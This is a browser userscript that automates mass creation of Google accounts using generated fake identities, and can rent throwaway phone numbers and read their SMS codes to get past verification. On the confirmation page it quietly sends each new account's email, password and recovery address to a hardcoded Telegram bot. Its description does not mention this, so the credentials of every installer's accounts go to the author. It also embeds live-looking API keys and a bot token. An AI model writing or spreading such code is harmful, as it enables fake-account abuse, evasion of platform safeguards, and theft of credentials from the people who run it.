// ==UserScript==
// @name         Google Account Creator
// @namespace    http://tampermonkey.net/
// @version      0.13
// @description  try to take over the world!
// @author       You
// @match        https://accounts.google.com/*
// @match        https://www.google.com/*
// @icon         https://www.google.com/s2/favicons?sz=64&domain=undefined.
// @require http://code.jquery.com/jquery-3.4.1.min.js
// @run-at document-start
// @license MIT
// @grant window.onurlchange
// @downloadURL https://update.greasyfork.org/scripts/468218/Google%20Account%20Creator.user.js
// @updateURL https://update.greasyfork.org/scripts/468218/Google%20Account%20Creator.meta.js
// ==/UserScript==

const user_api = 'hg9LgP1qGptDk06YKkIW7w==dPWbcw8XfgFexefj'
const bot_api = "6216918086:AAGMQYMnhJcU0881HIrfOfsWxn1OCnE1NFk";
const automatic = false;
const recovery_email = ["candydevreply@gmail.com"]
const chat_id = 912433251
window.user = {}
function gotoGmail() {
    console.log("Going to Gmail")
    var a = document.getElementsByTagName('a');
    for (var i = 0; i < a.length; ++i) {
        if (a[i].textContent == "Get GmailCreate an account") {
            return a[i].click()
        }
    }
}
if (window.onurlchange === null) {
    // feature is supported
    window.addEventListener('urlchange', (info) => {
        const host = location.protocol + '//' + location.hostname;
        let path = window.location.pathname
        console.log(path)
        if (host == 'https://www.google.com') {
            return gotoGmail();
        } else if (host == 'https://accounts.google.com') {
            if (path == "/_/bscframe") {
                return;
            }
            if (path == '/v3/signin/identifier') {
                ClickBtn("Create account")
                Clickli("For my personal use")

            }
            if (path == '/signup/v2/createaccount') {
                getDetails();
                try {
                    setTimeout(() => {
                        const name = window.localStorage.getItem('user_name')
                        console.log("NAME : " + name)
                        document.getElementById("firstName").value = name
                        setTimeout(() => { ClickBtn("Next"); }, 1000)
                    }, 4000);
                } catch (error) {
                }
                return;
            }
            if (path == '/signup/v2/birthdaygender') {
                getDetails();
                try {
                    setTimeout(() => {
                        const birth = window.localStorage.getItem('user_birthday')
                        const sex = window.localStorage.getItem('user_sex')
                        console.log("Birth Day : " + birth)
                        const abirth = birth.split("-")
                        document.getElementById("day").value = abirth[2];
                        document.getElementById("month").value = parseInt(abirth[1]);
                        document.getElementById("year").value = parseInt(abirth[0]);
                        document.getElementById("gender").value = sex == "M" ? 1 : 2
                        setTimeout(() => { ClickBtn("Next"); }, 1000)
                    }, 3500);
                } catch (error) {
                }
                return;
            }
            if (path == '/signup/v2/createusername') {
                getDetails();
                try {
                    const username = window.localStorage.getItem('user_username') + Math.floor(10000 + Math.random() * 90000)
                    console.log("username : " + username)
                    setTimeout(() => {
                        document.getElementsByName("Username")[0].value = username;
                        selectEmail()
                        setTimeout(() => { ClickBtn("Next"); }, 1000)
                    }, 3500);
                } catch (error) {
                }
                return;
            }
            if (path == '/signup/v2/createpassword') {
                getDetails();
                try {
                    const password = window.localStorage.getItem('user_username') + Math.floor(10000 + Math.random() * 90000)
                    window.localStorage.setItem('user_password', `${password}`)
                    console.log("Password : " + password)
                    setTimeout(() => {
                        document.getElementsByName("Passwd")[0].value = password;
                        document.getElementsByName("PasswdAgain")[0].value = password
                        selectEmail()
                        setTimeout(() => { ClickBtn("Next"); }, 1000)
                    }, 3500);
                } catch (error) {
                }
                return;
            }
            if (path == '/signup/v2/idvbyphone') {
                try {
                    if (automatic) {
                        getPhoneNumber();
                    }
                } catch (error) {
                }
                return;
            }
            if (path == '/signup/v2/verifyidvphone') {
                try {
                    if (automatic) {
                        var timer = setInterval(() => {
                            fetch(`https://digital-market.xyz/api/services/getMessage/?api_key=a6bf71605f8bc24a9c5bf0e30253b456b2fa&order_id=${window.localStorage.getItem('user_phone_id')}`, { method: 'GET' })
                                .then(response => response.json())
                                .then(result => {
                                    if (result.message == "Waiting For SMS ..") {
                                        return;
                                    } else {
                                        clearInterval(timer);
                                        document.getElementById("code").value = result.message;
                                        setTimeout(() => { ClickBtn("Next"); }, 1000)
                                    }
                                }).catch(err => alert(err));
                        }, 2500);
                    }
                } catch (error) {
                }
                return;
            }
            if (path == '/signup/v2/addrecoveryemail') {
                try {
                    setTimeout(() => {
                        const random = Math.floor(Math.random() * recovery_email.length);
                        const recovery = recovery_email[random]
                        window.localStorage.setItem("user_recovery", recovery)
                        document.getElementById("recoveryEmailId").value = recovery;
                        setTimeout(() => { ClickBtn("Next"); }, 1000)
                    }, 2500);
                } catch (error) {
                }
                return;
            }
            if (path == '/signup/v2/phonecollection') {
                try {
                    setTimeout(() => { ClickBtn("Skip"); }, 1000)
                } catch (error) {
                }
                return;
            }
            if (path == '/signup/v2/confirmation') {
                try {
                    const email = document.querySelectorAll('[data-email]')[0].textContent;
                    const password = window.localStorage.getItem('user_password');
                    const remail = window.localStorage.getItem("user_recovery")

                    console.log(`
                    Email : ${email}
                    Password : ${password}
                    `)
                    const text = `${email}:${password}:${remail}`
                    fetch(`https://api.telegram.org/bot6216918086:AAGMQYMnhJcU0881HIrfOfsWxn1OCnE1NFk/sendMessage?chat_id=${chat_id}&text=${text}`)
                        .then(response => response.json())
                        .then(response => console.log(response))
                        .catch(err => console.error(err));
                    setTimeout(() => { ClickBtn("Next"); }, 3000)
                } catch (error) {
                }
                return;
            }
            if (path == '/signup/v2/termsofservice') {
                try {
                    setTimeout(() => {
                        ClickBtn("I agree")
                    }, 2500);
                } catch (error) {
                }
                return;
            }
        }
    });
}

function getInputs() {
    var input = document.getElementsByTagName('input');
    for (var i = 0; i < input.length; ++i) {
        console.log(input[i].id)
        if (input[i].id == "Get GmailCreate an account") {
            return input[i].click()
        }
    }
}
function getPhoneNumber() {
    getNumber();
    setTimeout(() => {
        document.getElementById("phoneNumberId").value = window.localStorage.getItem('user_phone');
        ClickBtn("Next")
    }, 5000);
    setTimeout(() => {
        const palert = document.querySelectorAll('[aria-live="polite"]')[0];
        if (palert.textContent != '') {
            console.log("Entering new number")
            window.localStorage.setItem('user_number', undefined);
            getPhoneNumber();
        }
    }, 7000);
}
function selectEmail() {
    var div = document.getElementsByTagName('div');
    for (var i = 0; i < div.length; ++i) {
        if (div[i].role == "radio") {
            return div[i].click()
        }
    }
}
function ClickBtn(text) {
    var btn = document.getElementsByTagName('button');
    for (var i = 0; i < btn.length; ++i) {
        if (btn[i].textContent == text) {
            return btn[i].click()
        }
    }
}
function ClickBtn(text) {
    var btn = document.getElementsByTagName('button');
    for (var i = 0; i < btn.length; ++i) {
        if (btn[i].textContent == text) {
            btn[i].textContent = "Clicked"
            return btn[i].click()
        }
    }
}
function Clickli(text) {
    var btn = document.getElementsByTagName('li');
    for (var i = 0; i < btn.length; ++i) {
        if (btn[i].textContent == text) {
            btn[i].click()
        }
    }
}
function getNumber() {
    const phone = window.localStorage.getItem('user_number');
    if (phone == undefined || phone == 'undefined') {

        fetch('https://digital-market.xyz/api/services/buyNumber?api_key=a6bf71605f8bc24a9c5bf0e30253b456b2fa&server=1&id=go', { method: 'GET' })
            .then(response => response.json())
            .then(result => {
                if (result.ok) {
                    window.number = result;
                    window.localStorage.setItem('user_number', `${true}`)
                    window.localStorage.setItem('user_phone', `+${result.data.number}`)
                    window.localStorage.setItem('user_phone_id', `${result.data.order_id}`)
                } else {
                    alert(result.error)
                }
            }).catch(err => alert(err));
    }
}
function getDetails() {
    const user = window.localStorage.getItem('user_session');
    if (user == undefined) {
        $.ajax({
            method: 'GET',
            url: 'https://api.api-ninjas.com/v1/randomuser',
            headers: { 'X-Api-Key': user_api },
            contentType: 'application/json',
            success: function (result) {
                window.user = result;
                window.localStorage.setItem('user_session', `${true}`)
                window.localStorage.setItem('user_name', `${result.name}`)
                window.localStorage.setItem('user_birthday', `${result.birthday}`)
                window.localStorage.setItem('user_sex', `${result.sex}`)
                window.localStorage.setItem('user_username', `${result.username}`)
            },
            error: function ajaxError(jqXHR) {
                alert('Error: ', jqXHR.responseText);
            }
        });
    }
}
(async function () {
    'use strict';
    console.log("Script is Running")
})();